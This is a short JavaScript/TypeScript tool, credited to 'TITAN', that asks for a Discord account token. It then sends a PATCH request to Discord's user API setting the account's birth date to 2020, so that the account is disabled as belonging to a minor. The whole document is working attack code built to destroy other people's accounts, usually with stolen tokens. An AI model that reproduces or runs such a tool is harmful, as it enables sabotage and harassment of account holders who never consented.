console.log(`             DISCORD ACCOUNT DISABLER BY TITAN`)
console.log(`             DISCORD: -TITAN#1337`)
console.log(`             WEBSITE: https://www.titanthealoneguy.tk`)
console.log();

let token = prompt(`TOKEN: `);
function disableAkk(token:string) {
  /* Disables discord account by changing date of birth to a minor(18-) age */
  fetch("https://discord.com/api/v9/users/@me", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US",
    "authorization": token,
    "content-type": "application/json",
    "sec-ch-ua": "\"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"",
    "sec-ch-ua-mobile": "?0",
    "x-debug-options": "bugReporterEnabled",
  },
  "body": "{\"date_of_birth\":\"2020-10-19\"}",
  "method": "PATCH",
  "mode": "cors",
  "credentials": "include"
  });
}

disableAkk(token);
